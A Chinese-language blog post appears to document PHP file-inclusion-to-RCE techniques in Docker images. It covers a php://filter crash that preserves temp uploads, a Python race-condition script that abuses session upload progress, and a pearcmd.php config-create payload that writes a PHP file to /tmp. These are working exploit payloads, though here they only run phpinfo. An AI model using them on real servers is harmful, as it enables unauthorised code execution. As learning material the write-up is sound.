# 前言

很早之前就见到的pearcmd.php的利用，但是一直没来学习，最近突然看到Thinkphp爆出来新的洞，利用方式也是通过docker裸文件包含，所以重新来学习一下关于docker裸文件包含的知识

# 裸文件包含Getshell

P牛在文章里面写了6种方法，但是只有用pearcmd.php这个是只要启动docker能包含文件就可以实现RCE的

首先在一个标准的docker启动后，我们没有办法去进行一个远程包含，其次再没有更改权限的情况下，是没有办法通过日志包含进行RCE的（权限不够）

另外在学习无字母数字RCE的时候，我们实现了上传一个通过临时文件RCE的，因为在PHP程序执行完成之前，上传的文件会在/tmp生成一个临时文件，文件名是php加上六个随机字符，在命令执行的时候我们可以通过通配符来匹配，但是这里是文件包含，我们需要用到完整的文件名，在P牛的文章中提到如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了

国内的安全研究者[@王一航](https://www.jianshu.com/p/dfd049924258) 曾发现过一个会导致PHP crash的方法：

```
include 'php://filter/string.strip_tags/resource=/etc/passwd';
```

正好用在文件包含的逻辑中。

先写一个上传借口

```
<form action="/" method="post" enctype="multipart/form-data">
    <div><input type="file" name="image"></div>
    <div><input type="submit" value="上传"></div>
</form>
```

![image-20221212115702064](images/1.png)

这个Bug在[7.1.20](https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e)以后被修复，也没有留下更新日志，我们可以使用7.0.33版本的PHP进行尝试。向文件包含的目标发送这个导致crash的路径，可见服务器已经挂了，返回空白：

![image-20221212115732788](images/2.png)

但是已经在/tmp留下了shell，如果多次写入的话，我们可以对后面六位进行爆破来getshell

当然导致php进程crash的也不止这一种办法，但是多多少少都会有一些条件

除此之外，P牛还介绍了通过配置开启的打Getshell

虽然在docker的默认环境中session.upload_progress.enable是开启的，但是呢`session.upload_progress.cleanup`，默认开启。在这个选项开启时，PHP会在上传请求被读取完成后自动清理掉这个Session，如果我们尝试把这个选项关闭，就可以读取到Session文件的内容了

![image-20221212120629635](images/3.png)

这种利用方式需要满足下面几个条件：

- 目标环境开启了`session.upload_progress.enable`选项
- 发送一个文件上传请求，其中包含一个文件表单和一个名字是`PHP_SESSION_UPLOAD_PROGRESS`的字段
- 请求的Cookie中包含Session ID

这里当满足条件的时候就可以用P牛的脚本了

```
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=phpinfo()?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)

```

用条件竞争向目标的tmp目录下写入success文件

## pearcmd.php的妙用

只要启动了docker默认条件就能直接使用这个方法

pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。

不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。

原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。

最后的payload（burp发包解决URL编码问题）

```
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

![image-20221212125250507](images/4.png)

可以看到写入了/tmp/hello.php

![image-20221212125432820](images/5.png)

只要包含这个文件就能执行里面的phpinfo了





参考链接

https://tttang.com/archive/1312/